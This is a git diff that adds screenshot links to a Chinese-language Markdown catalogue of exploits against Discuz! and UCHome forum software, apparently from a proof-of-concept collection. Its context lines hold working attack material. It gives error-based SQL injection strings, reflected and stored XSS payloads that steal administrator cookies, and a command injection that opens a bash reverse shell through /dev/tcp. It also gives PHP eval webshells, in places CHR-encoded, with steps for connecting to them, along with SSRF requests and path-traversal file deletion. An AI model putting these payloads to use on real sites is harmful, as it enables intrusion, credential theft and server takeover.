@@ -43,17 +43,33 @@ http://ip/member/pm.php?dopost=read&id=1
 #### 演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）
 找到注入点：http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=x
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/2.png)
+
 也就是说我们可以控制的部分有很多。 且不看全局防注入源码，黑盒试一下我发现一旦出现'、(就会拦截，而且注释符（#、--）也会拦截。 括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/3.png)
 
 我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/4.png)
+
 执行会提示Unknown column 'daytime' in 'field list'。 所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/5.png)
+
 大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。 那么，有的同学再问，sql语句后半部分
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/6.png)
+
 没有注释符怎么处理？ 这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。 所以，先构造一个url：
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/7.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/8.png)
 
 可以看到已经出数据了。但发现出来的数据只有4位。 原因是，在源码中使用了substr取了daytime的第4到8位。修改POC
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/9.png)
 
 参考链接：https://www.secpulse.com/archives/26869.html
 #### 演示3：discuz ychat插件注入漏洞
@@ -63,6 +79,8 @@ cid参数存在SQL注入
 #### 演示4：Discuz Plugin JiangHu 1.1 /forummission.php SQL注入漏洞
 forummission.php？index=show$id=24中的id参数存在sql注入漏洞
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/10.png)
+
 参考链接：http://www.gltc.cn/30161.html
 #### 演示5：Discuz 6.0 /my.php SQL注入漏洞
 把以下EXP保存成HTML文档
@@ -70,14 +88,21 @@ forummission.php？index=show$id=24中的id参数存在sql注入漏洞
 
 使用浏览器打开
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/11.png)
+
 参考链接：https://bugs.shuimugan.com/bug/view?bug_no=80359
 #### 演示6：UChome 注入漏洞1
 首先注册用户 然后新建一个相册 http://127.0.0.1/uchome/space.php?uid=2&do=album&view=me 打开这里点上传 新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片 直接确认 然后抓包 把titie的那个改成 title%5B1' and (select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/12.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93618
 #### 演示7：UChome 注入漏洞2
 注册用户后登陆 然后点击日志 创建新日志 然后打开BURP进行抓包 找一个没有用的POST选项 改成picids['] 然后在提交 就可以看到结果了
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/13.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/14.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93616
 #### 演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞
@@ -85,6 +110,8 @@ http://ip/jiaoyou.php?pid=1
 http://ip/jiaoyou.php?mod=search&residecity=
 http://ip/jiaoyou.php?mod=search&resideprovince=
 pid、residecity、resideprovince参数均存在SQL注入
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/15.png)
 
 参考链接：
 https://www.unhonker.com/bug/1058.html
@@ -95,6 +122,8 @@ https://www.seebug.org/vuldb/ssvid-93641
 即针对该注入漏洞的攻击EXP为：
 http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&pac=info&gid=110 or @`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b) or @`’`  or @`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b) or @`’`
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/16.png)
+
 可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。
 参考链接：http://netsecurity.51cto.com/art/201303/386717.htm
 #### 演示10：Discuz x1.5 x2.0 二次注射
@@ -104,6 +133,8 @@ http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&pac=info&gid=110 or @
 #### 演示11：Discuz! X2 forum_attachment.php sql注入漏洞
 http://www.discuz.net/forum.php?mod=attachment&findpost=ss&aid=
 链接中，aid参数存在SQL注入，但需要把SQL语句进行base64编码，如
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/17.png)
 
 参考链接：https://www.cnblogs.com/devi1o/articles/4874822.html
 #### 演示12：Discuz！7.2/X1 第三方插件SQL注入及持久型XSS漏洞
@@ -123,7 +154,11 @@ id参数存在SQL注入。
 #### 演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)
 在管理后台-工具-数据-调用-自定义模块存在SQL注入，详情看图即可明白
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/18.png)
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/19.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/20.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93737
 漏洞POC：
@@ -157,12 +192,17 @@ http://ip/admincp.php?infloat=yes&handlekey=123);alert(/xss/);//  http://ip/logg
 访问如下链接即可触发
 http://ip/logging.php?action=logout&formhash=b1abb3e2&referer=%27-alert%28document.domain%29-
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/21.png)
+
 参考链接：https://www.seebug.org/vuldb/ssvid-89252
 #### 演示3：Disucz X3.2 多处反射型XSS漏洞
 http://ip/member.php?mod=logging&action=login&referer=javascript://www.discuz.net/
 http://ip/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/
 以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/22.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/23.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93719
 ## 存储型XSS漏洞
@@ -185,11 +225,19 @@ http://ip/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www
 #### 演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）
 discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~ 接着咱们就用admin帐号先把一个帖子弄成直播！
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/24.png)
+
 先把payload进行base16编码（如果不拦截，直接上原始payload）
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/25.png)
 
 在直播发帖处进行发表
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/26.png)
+
 弹窗~
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/27.png)
 
 参考链接：
 https://www.secpulse.com/archives/33389.html
@@ -197,8 +245,13 @@ https://www.seebug.org/vuldb/ssvid-93716
 #### 演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：
 此处演示绕过：在发帖或回复处添加“[email]2"onmouseover="alert(2)[/email]” 
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/28.png)
+
 然后对帖子或者评论进行编辑时，与页面进行一定交互时即可触发 XSS：
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/29.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/30.png)
 
 参考链接：
 http://0day5.com/archives/3323/
@@ -207,53 +260,87 @@ https://bugs.shuimugan.com/bug/view?bug_no=139851
 #### 演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞
 在论坛自助购买广告位处，在“文字内容中”填写"><img/src=1/>
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/31.png)
+
 在管理后台-应用-自助广告位可发现弹出窗口
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/32.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-90006
 #### 演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员
 在添加链接处，如添加友链或发帖内容填写友链处。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/33.png)
+
 添加xss代码
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/34.png)
+
 等管理员审核的时候获取到cookie
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/35.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93713
 #### 演示5：Discuz! X2.5后台禁言xss
 在论坛首页管理 禁止用户那 输入你能管理的用户名称 然后选择禁言 理由那插入payload
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/36.png)
+
 漏洞证明
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/37.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93645
 #### 演示6：Discuz!附件解析漏洞导致XSS
 先新建一个php文件，写入XSS代码：<img src=1 onerror=alert(document.cookie)>
 然后保存再将它的后缀名字改成.rar，然后上传附件。点击附件下载，提示即将下：
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/38.png)
+
 右键审查元素得到一个类似下面这样附件的地址（这里不是直接在帖子中得到地址而是通过下载提示之后）
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/39.png)
 
 在地址后添加一段：-request-文件名.php.html，如下：
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/40.png)
+
 当作html执行，XSS代码被触发！
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/41.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93631
 #### 演示7：DiscuzX3.1/X3/X2.5/X2 抢楼存在存储型XSS
 在抢楼-奖励楼层处添加payload
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/42.png)
+
 完成后触发xss
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/43.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93620
 #### 演示8：Ucenter Home 2.0及以下存储型XSS
 在插入视频处，如发帖处的插入视频，设置如下payload: [flash]http://" onmouseover='document.body.innerHTML=String.fromCharCode(60,105,102,114,97,109,101,47,111,110,108,111,97,100,61,39,106,97,118,97,115,99,114,105,112,116,58,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,49,54,44,49,48,57,44,49,50,48,44,49,48,55,44,52,54,44,49,49,49,44,49,49,52,44,49,48,51,44,52,55,44,49,49,51,44,52,54,44,49,48,54,44,49,49,53,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,41,39,62)'[/flash]
 完成后弹窗
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/44.png)
+
 参考链接：https://www.seebug.org/vuldb/ssvid-93654
 #### 演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞
 在发表日志内容处添加XSS代码
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/45.png)
+
 完成后触发XSS
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/46.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93665
 #### 演示10：Discuz 4.0 头像设置处可以持久型脚本
 头像设置处，先选一个系统自带头像，提交，抓包。 将头像地址“customavatars/190.jpg”替换为xss脚本“javascript:alert(/大家新年快乐啊！/)”（此处会过滤<,”,’），post提交后，触发XSS
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/47.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93680
 #### 演示11：Discuz! 所有版本永久型跨站漏洞
@@ -262,10 +349,15 @@ https://bugs.shuimugan.com/bug/view?bug_no=139851
 #### 演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)
 在发帖或回帖处设置内容为“[audio]javascript:alert(document.cookie)//.wav[/audio]”，触发XSS
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/48.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/49.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93737
 #### 演示13：Discuz! trade.php 数据库'注射' bug
 问题在trade,php中，找到类似于如下请求包，设置目录以及message参数中的payload（注意：一定是199个A）
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/50.png)
 
 之后会执行XSS。
 参考链接：http://h2016.blog.163.com/blog/static/100863425200810413817385/
@@ -288,10 +380,17 @@ http://ip/bbs/admincp.php?action=runwizard&step=3
 #### 演示1：Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)
 在管理后台-站长-数据库-备份中选择好要备份的表、数据和备份的方式
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/51.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/52.png)
 
 提交，使用burpsuit抓包，修改customtables[] = pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/53.png)
+
 成功
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/54.png)
 
 参考链接：
 https://www.seebug.org/vuldb/ssvid-97510
@@ -301,10 +400,14 @@ https://www.anquanke.com/post/id/158270
 GET/dzx25/forum.php?mod=image&aid=1&size=|bash%20i%20>%26%20/dev/tcp/127.0.0.1/8888%200>%261|x300&key=68b54146d9d1bfb2ebb38f44f2427454&nocache=yes&type=1&ramdom=xfie9
 使用nc命令监听本地8888端口，成功获取到反弹的shell
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/55.png)
+
 参考链接：http://0day5.com/archives/2846/
 #### 演示3：Discuz 6.x/7.x /include/discuzcode.func.php 代码执行漏洞
 访问一个存在的帖子，需要访问的页面有表情。 例如：http://192.168.0.222/bbs/viewthread.php?tid=12&extra=page%3D1 然后刷新帖子，拦截数据包，cookie中添加
 1GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/56.png)
 
 参考链接：
 https://www.cnblogs.com/milantgh/p/4199432.html
@@ -315,7 +418,11 @@ https://bugs.shuimugan.com/bug/view?bug_no=80723
 在该链接下：http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&source=d7.2_x2.0
 发送如下POST请求包(设置newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa)。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/57.png)
+
 菜刀连接地址www.test.ichunqiu/utility/convert/data/config.inc.php 密码c
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/58.png)
 
 参考链接：
 https://bbs.ichunqiu.com/thread-1909-1-1.html
@@ -329,18 +436,35 @@ d.访问日志，论坛根目录下生成demo.php，一句话密码：c。
 #### 演示6：Discuz! X3.1后台任意代码执行可拿shell
 全局--〉网站第三方统计代码--〉插入php代码,如插入 <?php phpinfo();?>
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/59.png)
+
 工具--〉更新缓存[为了保险起见，更新下系统缓存]：
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/60.png)
 
 门户--> HTML管理--〉设置：1）静态文件扩展名[一定要设置成htm] ：htm 2)专题HTML存放目录: template/default/portal 3)设置完，提交吧！
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/61.png)
+
 门户--〉专题管理--〉创建专题：1）专题标题：xyz 2）静态化名称：portal_topic_222 //222为自定义文件名，自己要记住 3）附加内容：选择上：站点尾部信息
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/62.png)
 
 提交,回到门户--〉专题管理,把刚才创建的专题开启，如下图
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/63.png)
+
 把刚才的专题，生成
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/64.png)
+
 下面就是关键了，现在到了包含文件的时候了。 再新建一个专题： 1）专题标题，静态化名称，这2个随便写 2）模板名：这个要选择我们刚才生成的页面：./template/default/portal/portal_topic_222.htm
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/65.png)
+
 然后提交，就执行了<?php phpinfo();?>
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/66.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93612
 #### 演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞
@@ -353,29 +477,49 @@ https://www.jb51.net/hack/26337.html
 在该链接下：http://www.80vul.com/bbs/admincp.php?action=runwizard&step=3
 发送如下POST请求包。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/67.png)
+
 可获取到webshell
 http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php
 参考链接：http://blog.51cto.com/simeon/113131
 #### 演示9：Discuz!X2.5最新版后台管理员权限Getshell
 在后台-->站长-->Ucenter设置处设置UcenterIP为: XX\\');eval($_POST[a])?>;// XX
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/68.png)
+
 发现管理页面代码出来了
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/69.png)
+
 上菜刀：http://127.0.0.1/d25/uc_server
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/70.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93655
 #### 演示10：Discuz后台getshell
 后台找到应用，插件
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/71.png)
+
 有一个好贷站长联盟
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/72.png)
 
 安装之后有一个导入接口信息
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/73.png)
+
 然后导入接口信息
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/74.png)
 
 接口信息会放到这里
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/75.png)
+
 然后就shell了
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/76.png)
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93624
 
@@ -390,18 +534,28 @@ http://ip/discuz_x3.2_sc_gbk/upload/portal.php
 #### 演示1：SSRF漏洞
 利用前提 ptid==aid且两者必须存在(ptid==帖子id,aid==门户文章id),pid=任意评论id。 即论坛门户发表过文章，准备和确认http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&aid=1 确认门户中存在发表过的文章,记录下可用的aid
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/77.png)
+
 第一步 登陆后,请求获取modauthkey算出的一个key,用于操作对应文章: http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&goto=findpost&modthreadkey=1&ptid=1&pid=1
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/78.png)
 
 从跳转的链接取出modthreadkey的参数值: http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=fce8163c9f310147f91a244a9eb9dc33#pid1 
 第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求: POST:http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&ac=upload&aid=1&catid=1&op=downremotefile&formhash=760dc9d6&modarticlekey=fce8163c9f310147f91a244a9eb9dc33&content=<img src=http://internal.zabbix/images/general/zabbix.png> aa=a
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/79.png)
+
 internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下: http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png
 http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/80.png)
 
 参考链接：http://0day5.com/archives/3920/
 #### 演示2：另一处SSRF漏洞（2.x，3.x）
 访问http://xxxx/bbs/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&formhash=09cec465
 3.x 版本如果请求提示xss拦截要带上 formhash 加cookie,之前版本好像不用。SSRF成功后，域名被解析成IP。
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/81.png)
 
 参考链接：https://bugs.shuimugan.com/bug/view?bug_no=151179
 ## 文件操作类漏洞
@@ -413,23 +567,40 @@ http://ip/discuz3_2/home.php?mod=spacecp&ac=profile
 #### 演示1：Discuz!X前台任意文件删除漏洞
 新建importantfile.txt作为测试  进入设置-个人资料，先在页面源代码找到formhash值  http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&ac=profile
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/82.png)
+
 可以看到formhash值是b21b6577。再访问10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&ac=profile&op=base  Post数据：birthprovince=../../../importantfile.txt&profilesubmit=1&formhash=b21b6577  如图
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/83.png)
 
 执行后
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/84.png)
+
 出生地被修改成要删除的文件。最后构造表单执行删除文件
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/85.png)
 
 随便上传一张图片，即可删除importantfile.txt。
 http://www.freebuf.com/vuls/149904.html
 #### 演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）
 问题插件出在：[MZG]点广告赚积分 1.0 http://addon.discuz.com/?@mzg_advertise.plugin 1.先搜索 “MZG” 找到 点广告赚积分。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/86.png)
+
 安装插件，安装GBK还是UFT8随你系统编码选择。安装好插件后，选择 “添加广告”。
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/87.png)
 
 添加广告里面的 LOGO 文件上传，选本地上传，这里面未限制文件后缀，可以上传任意后缀名文件。
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/88.png)
+
 查看添加的广告，看到了吧？
 
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/89.png)
+
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/90.png)
 
 https://www.seebug.org/vuldb/ssvid-93632
 
